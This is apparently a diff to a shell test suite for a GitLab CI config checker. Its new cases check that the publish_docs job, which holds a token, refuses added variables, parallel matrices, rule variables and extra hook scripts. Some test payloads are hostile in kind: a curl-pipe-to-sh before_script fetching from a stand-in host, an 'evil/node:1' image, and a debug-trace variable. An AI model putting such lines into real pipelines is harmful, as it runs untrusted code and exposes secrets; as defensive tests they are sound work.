@@ -912,7 +912,8 @@ split_case "p69: NODE_IMAGE in the variables under default" $ci "in default > va
   y = y.replace("default:\n  tags: [light]\n", "default:\n  tags: [light]\n  variables:\n    NODE_IMAGE: evil/node:1\n");'
 split_case "p70: NODE_IMAGE in a workflow rule added as a new rule" $ci "in workflow > rules > [0-9]+ > variables: sets NODE_IMAGE" '
   y = y.replace("    - if: $CI_COMMIT_BRANCH\n\n.not_scheduled", "    - if: $CI_COMMIT_BRANCH\n      variables:\n        NODE_IMAGE: evil/node:1\n\n.not_scheduled");'
-yaml_pass_case "p71: an unrelated variable in publish_docs passes" '
+# p71 (was a pass case) now refuses: round 4 item 4 allows publish_docs no variable but GIT_DEPTH and GIT_STRATEGY.
+split_case "p71: an unrelated variable in publish_docs is refused" $ci "(publish_docs.*variables|variables.*publish_docs)" '
   y = y.replace("    GIT_STRATEGY: clone\n", "    GIT_STRATEGY: clone\n    HARMLESS: one\n");'
 # Cases p72-p84 judge item 1 of the split check (issue #60 round 3): .gitlab-ci.yml
 # may hold only tab, line feed and printable ASCII (0x20-0x7E). Any other
@@ -971,7 +972,8 @@ split_case "p91: a top-level before_script written with a quoted key" $ci "(top-
   y = y + "\n\"before_script\":\n  - echo hi\n";'
 split_case "p92: a top-level cache in flow style" $ci "(top-level|top level|global|deprecated).*cache|cache.*(top-level|top level|global|deprecated)" '
   y = y + "\ncache: { paths: [ tools/node_modules/ ] }\n";'
-yaml_pass_case "p93: a harmless before_script and after_script under default pass" '
+# p93 (was a pass case) now refuses: round 4 item 3 leaves publish_docs no hook, default's included.
+split_case "p93: a harmless before_script and after_script under default are refused" $ci "(publish_docs.*(before_script|after_script)|(before_script|after_script).*publish_docs)" '
   y = y.replace("default:\n  tags: [light]\n", "default:\n  tags: [light]\n  before_script:\n    - echo hi\n  after_script:\n    - echo bye\n");'
 yaml_pass_case "p94: a before_script and services on lint, which publish_docs does not inherit from, pass" '
   y = y.replace("lint:\n  stage: lint\n", "lint:\n  stage: lint\n  before_script:\n    - echo hi\n  services:\n    - name: postgres:16\n");'
@@ -994,6 +996,106 @@ split_case "p100: publish_docs extending a list of parents, one with dependencie
   y = y + "\n.plain:\n  interruptible: false\n\n.parent:\n  dependencies: []\n";'
 yaml_pass_case "p101: dependencies on lint, which publish_docs does not inherit from, pass" '
   y = y.replace("lint:\n  stage: lint\n", "lint:\n  stage: lint\n  dependencies: []\n");'
+# Cases p102-p139 judge round 4 (#60): what runs beside the token is exactly what is
+# written. Standard pattern: allowlist the token job's shape. Patterns name the job
+# and the keyword, and every payload is one the older package-manager and
+# dependencies checks cannot refuse, so only the new rules can.
+# Item 1: publish_docs has no parallel, in any form (a matrix can override GIT_STRATEGY).
+split_case "p102: publish_docs with parallel as a number" $ci "(publish_docs.*parallel|parallel.*publish_docs)" '
+  y = y.replace("  script:\n    - sh tools/ci/nightly-publish.sh\n", "  parallel: 2\n  script:\n    - sh tools/ci/nightly-publish.sh\n");'
+split_case "p103: publish_docs with parallel as 1" $ci "(publish_docs.*parallel|parallel.*publish_docs)" '
+  y = y.replace("  script:\n    - sh tools/ci/nightly-publish.sh\n", "  parallel: 1\n  script:\n    - sh tools/ci/nightly-publish.sh\n");'
+split_case "p104: publish_docs with a parallel matrix overriding GIT_STRATEGY" $ci "(publish_docs.*parallel|parallel.*publish_docs)" '
+  y = y.replace("  script:\n    - sh tools/ci/nightly-publish.sh\n", "  parallel:\n    matrix:\n      - GIT_STRATEGY: [none, fetch]\n  script:\n    - sh tools/ci/nightly-publish.sh\n");'
+split_case "p105: publish_docs with a parallel matrix in flow style" $ci "(publish_docs.*parallel|parallel.*publish_docs)" '
+  y = y.replace("  script:\n    - sh tools/ci/nightly-publish.sh\n", "  parallel: { matrix: [ { GIT_STRATEGY: [none] } ] }\n  script:\n    - sh tools/ci/nightly-publish.sh\n");'
+split_case "p106: publish_docs extending a parent with parallel" $ci "(publish_docs.*parallel|parallel.*publish_docs)" '
+  y = y.replace("publish_docs:\n  stage: publish\n", "publish_docs:\n  extends: .par\n  stage: publish\n");
+  y = y + "\n.par:\n  parallel: 3\n";'
+split_case "p107: publish_docs extending a grandparent with a parallel matrix" $ci "(publish_docs.*parallel|parallel.*publish_docs)" '
+  y = y.replace("publish_docs:\n  stage: publish\n", "publish_docs:\n  extends: .par\n  stage: publish\n");
+  y = y + "\n.par:\n  extends: .grand\n\n.grand:\n  parallel:\n    matrix:\n      - GIT_STRATEGY: [none]\n";'
+split_case "p108: publish_docs taking parallel through !reference" $ci "(publish_docs.*parallel|parallel.*publish_docs)" '
+  y = y.replace("  script:\n    - sh tools/ci/nightly-publish.sh\n", "  parallel: !reference [.par, parallel]\n  script:\n    - sh tools/ci/nightly-publish.sh\n");
+  y = y + "\n.par:\n  parallel: 2\n";'
+yaml_pass_case "p109: parallel on lint, which publish_docs does not inherit from, passes" '
+  y = y.replace("lint:\n  stage: lint\n", "lint:\n  stage: lint\n  parallel: 2\n");'
+# Item 2: no entry of publish_docs's rules sets variables (they override job variables).
+split_case "p110: the publish_docs rule setting variables" $ci "(publish_docs.*rules.*variables|rules.*variables.*publish_docs)" '
+  y = y.replace("    deployment_tier: other\n  rules:\n    - if: $CI_PIPELINE_SOURCE == \"schedule\" && $IMPORT_DOCS == \"true\" && $CI_COMMIT_BRANCH == \"main\"\n", "    deployment_tier: other\n  rules:\n    - if: $CI_PIPELINE_SOURCE == \"schedule\" && $IMPORT_DOCS == \"true\" && $CI_COMMIT_BRANCH == \"main\"\n      variables:\n        GIT_STRATEGY: none\n");'
+split_case "p111: publish_docs with a second rule setting variables" $ci "(publish_docs.*rules.*variables|rules.*variables.*publish_docs)" '
+  y = y.replace("    deployment_tier: other\n  rules:\n    - if: $CI_PIPELINE_SOURCE == \"schedule\" && $IMPORT_DOCS == \"true\" && $CI_COMMIT_BRANCH == \"main\"\n", "    deployment_tier: other\n  rules:\n    - if: $CI_PIPELINE_SOURCE == \"schedule\" && $IMPORT_DOCS == \"true\" && $CI_COMMIT_BRANCH == \"main\"\n    - if: $CI_COMMIT_BRANCH == \"none\"\n      variables:\n        GIT_STRATEGY: none\n");'
+split_case "p112: publish_docs with empty variables on its rule" $ci "(publish_docs.*rules.*variables|rules.*variables.*publish_docs)" '
+  y = y.replace("    deployment_tier: other\n  rules:\n    - if: $CI_PIPELINE_SOURCE == \"schedule\" && $IMPORT_DOCS == \"true\" && $CI_COMMIT_BRANCH == \"main\"\n", "    deployment_tier: other\n  rules:\n    - if: $CI_PIPELINE_SOURCE == \"schedule\" && $IMPORT_DOCS == \"true\" && $CI_COMMIT_BRANCH == \"main\"\n      variables: {}\n");'
+split_case "p113: publish_docs rules taken by !reference from rules that set variables" $ci "(publish_docs.*rules.*variables|rules.*variables.*publish_docs)" '
+  y = y.replace("    deployment_tier: other\n  rules:\n    - if: $CI_PIPELINE_SOURCE == \"schedule\" && $IMPORT_DOCS == \"true\" && $CI_COMMIT_BRANCH == \"main\"\n", "    deployment_tier: other\n  rules:\n    - !reference [.rv, rules]\n");
+  y = y + "\n.rv:\n  rules:\n    - if: $CI_PIPELINE_SOURCE == \"schedule\" && $IMPORT_DOCS == \"true\" && $CI_COMMIT_BRANCH == \"main\"\n      variables:\n        GIT_STRATEGY: none\n";'
+yaml_pass_case "p114: a rule setting variables on another job passes" '
+  y = y + "\nfine14:\n  stage: lint\n  rules:\n    - if: $CI_COMMIT_BRANCH\n      variables:\n        FOO: bar\n  script:\n    - \"true\"\n";'
+# Item 3: publish_docs's resolved script is exactly `sh tools/ci/nightly-publish.sh`; its
+# resolved before_script and after_script (own, extends, !reference or default:) are empty.
+split_case "p115: a curl-to-sh before_script under default" $ci "(publish_docs.*(before_script|script)|(before_script|script).*publish_docs)" '
+  y = y.replace("default:\n  tags: [light]\n", "default:\n  tags: [light]\n  before_script:\n    - curl -sSf https://example.invalid/x.sh | sh\n");'
+split_case "p116: a harmless after_script under default" $ci "(publish_docs.*after_script|after_script.*publish_docs)" '
+  y = y.replace("default:\n  tags: [light]\n", "default:\n  tags: [light]\n  after_script:\n    - echo bye\n");'
+split_case "p117: a harmless before_script of publish_docs" $ci "(publish_docs.*before_script|before_script.*publish_docs)" '
+  y = y.replace("  script:\n    - sh tools/ci/nightly-publish.sh\n", "  before_script:\n    - echo hi\n  script:\n    - sh tools/ci/nightly-publish.sh\n");'
+split_case "p118: a harmless after_script of publish_docs" $ci "(publish_docs.*after_script|after_script.*publish_docs)" '
+  y = y.replace("  script:\n    - sh tools/ci/nightly-publish.sh\n", "  script:\n    - sh tools/ci/nightly-publish.sh\n  after_script:\n    - echo bye\n");'
+split_case "p119: publish_docs extending a parent with a harmless before_script" $ci "(publish_docs.*before_script|before_script.*publish_docs)" '
+  y = y.replace("publish_docs:\n  stage: publish\n", "publish_docs:\n  extends: .hk\n  stage: publish\n");
+  y = y + "\n.hk:\n  before_script:\n    - echo hi\n";'
+split_case "p120: publish_docs extending a parent with a harmless after_script" $ci "(publish_docs.*after_script|after_script.*publish_docs)" '
+  y = y.replace("publish_docs:\n  stage: publish\n", "publish_docs:\n  extends: .hk\n  stage: publish\n");
+  y = y + "\n.hk:\n  after_script:\n    - echo bye\n";'
+split_case "p121: publish_docs taking a harmless before_script by !reference" $ci "(publish_docs.*before_script|before_script.*publish_docs)" '
+  y = y.replace("  script:\n    - sh tools/ci/nightly-publish.sh\n", "  before_script: [ !reference [.hk, before_script] ]\n  script:\n    - sh tools/ci/nightly-publish.sh\n");
+  y = y + "\n.hk:\n  before_script:\n    - echo hi\n";'
+split_case "p122: publish_docs taking a harmless after_script by !reference" $ci "(publish_docs.*after_script|after_script.*publish_docs)" '
+  y = y.replace("  script:\n    - sh tools/ci/nightly-publish.sh\n", "  script:\n    - sh tools/ci/nightly-publish.sh\n  after_script: [ !reference [.hk, after_script] ]\n");
+  y = y + "\n.hk:\n  after_script:\n    - echo bye\n";'
+split_case "p123: a split word (n\"\"pm) added to the publish_docs script" $ci "(publish_docs.*script|script.*publish_docs)" '
+  y = y.replace("  script:\n    - sh tools/ci/nightly-publish.sh\n", "  script:\n    - n\"\"pm exec x\n    - sh tools/ci/nightly-publish.sh\n");'
+split_case "p124: a harmless second line in the publish_docs script" $ci "(publish_docs.*script|script.*publish_docs)" '
+  y = y.replace("    - sh tools/ci/nightly-publish.sh\n", "    - sh tools/ci/nightly-publish.sh\n    - echo done\n");'
+split_case "p125: a harmless line before the publish_docs script line" $ci "(publish_docs.*script|script.*publish_docs)" '
+  y = y.replace("  script:\n    - sh tools/ci/nightly-publish.sh\n", "  script:\n    - echo start\n    - sh tools/ci/nightly-publish.sh\n");'
+split_case "p126: the publish_docs script line with an extra argument" $ci "(publish_docs.*script|script.*publish_docs)" '
+  y = y.replace("    - sh tools/ci/nightly-publish.sh\n", "    - sh tools/ci/nightly-publish.sh --x\n");'
+split_case "p127: the publish_docs script line run with bash" $ci "(publish_docs.*script|script.*publish_docs)" '
+  y = y.replace("    - sh tools/ci/nightly-publish.sh\n", "    - bash tools/ci/nightly-publish.sh\n");'
+split_case "p128: the publish_docs script line followed by a command on one line" $ci "(publish_docs.*script|script.*publish_docs)" '
+  y = y.replace("    - sh tools/ci/nightly-publish.sh\n", "    - sh tools/ci/nightly-publish.sh; echo done\n");'
+split_case "p129: the publish_docs script as a literal block of two lines" $ci "(publish_docs.*script|script.*publish_docs)" '
+  y = y.replace("    - sh tools/ci/nightly-publish.sh\n", "    - |\n      sh tools/ci/nightly-publish.sh\n      echo done\n");'
+split_case "p130: the publish_docs script taken from a parent with another line" $ci "(publish_docs.*script|script.*publish_docs)" '
+  y = y.replace("  script:\n    - sh tools/ci/nightly-publish.sh\n", "  script: [ !reference [.s, script] ]\n");
+  y = y + "\n.s:\n  script:\n    - echo hi\n    - sh tools/ci/nightly-publish.sh\n";'
+yaml_pass_case "p131: empty before_script and after_script on publish_docs pass" '
+  y = y.replace("  script:\n    - sh tools/ci/nightly-publish.sh\n", "  before_script: []\n  script:\n    - sh tools/ci/nightly-publish.sh\n  after_script: []\n");'
+# Item 4: publish_docs's own variables are exactly GIT_DEPTH: 1 and GIT_STRATEGY: clone.
+# (p71 above holds the unrelated-variable case.) p133 and p134 are already refused by the
+# older GIT_STRATEGY check; they stay so that check cannot be lost.
+split_case "p133: GIT_STRATEGY: fetch in publish_docs" $ci "(publish_docs.*GIT_STRATEGY|GIT_STRATEGY.*publish_docs)" '
+  y = y.replace("    GIT_STRATEGY: clone\n", "    GIT_STRATEGY: fetch\n");'
+split_case "p134: GIT_STRATEGY: none in publish_docs" $ci "(publish_docs.*GIT_STRATEGY|GIT_STRATEGY.*publish_docs)" '
+  y = y.replace("    GIT_STRATEGY: clone\n", "    GIT_STRATEGY: none\n");'
+split_case "p135: GIT_DEPTH: 2 in publish_docs" $ci "(publish_docs.*GIT_DEPTH|GIT_DEPTH.*publish_docs)" '
+  y = y.replace("    GIT_DEPTH: 1\n", "    GIT_DEPTH: 2\n");'
+split_case "p136: GIT_DEPTH missing from publish_docs" $ci "(publish_docs.*GIT_DEPTH|GIT_DEPTH.*publish_docs)" '
+  y = y.replace("    GIT_DEPTH: 1\n", "");'
+split_case "p137: GIT_DEPTH written as the string \"1\" in publish_docs" $ci "(publish_docs.*GIT_DEPTH|GIT_DEPTH.*publish_docs)" '
+  y = y.replace("    GIT_DEPTH: 1\n", "    GIT_DEPTH: \"1\"\n");'
+split_case "p138: a CI debug variable added to publish_docs" $ci "(publish_docs.*variables|variables.*publish_docs)" '
+  y = y.replace("    GIT_STRATEGY: clone\n", "    GIT_STRATEGY: clone\n    CI_DEBUG_TRACE: \"true\"\n");'
+split_case "p139: a variable in publish_docs written in flow style" $ci "(publish_docs.*variables|variables.*publish_docs)" '
+  y = y.replace("  variables:\n    GIT_DEPTH: 1\n    GIT_STRATEGY: clone\n", "  variables: { GIT_DEPTH: 1, GIT_STRATEGY: clone, HARMLESS: one }\n");'
+yaml_pass_case "p140: the same two variables in flow style on publish_docs pass" '
+  y = y.replace("  variables:\n    GIT_DEPTH: 1\n    GIT_STRATEGY: clone\n", "  variables: { GIT_DEPTH: 1, GIT_STRATEGY: clone }\n");'
+yaml_pass_case "p141: the two variables in the other order on publish_docs pass" '
+  y = y.replace("    GIT_DEPTH: 1\n    GIT_STRATEGY: clone\n", "    GIT_STRATEGY: clone\n    GIT_DEPTH: 1\n");'
+yaml_pass_case "p142: other variables on another job pass" '
+  y = y + "\nfine15:\n  stage: lint\n  variables:\n    GIT_STRATEGY: none\n    HARMLESS: one\n  script:\n    - \"true\"\n";'
 # Cases (d1)-(d3) judge the section "the imported docs have the shape the import
 # writes" (issue #18): the pad draws the index's colour and ids into innerHTML.
 # shape_case <label> <file> <js>: <js> edits the parsed JSON j of the file.
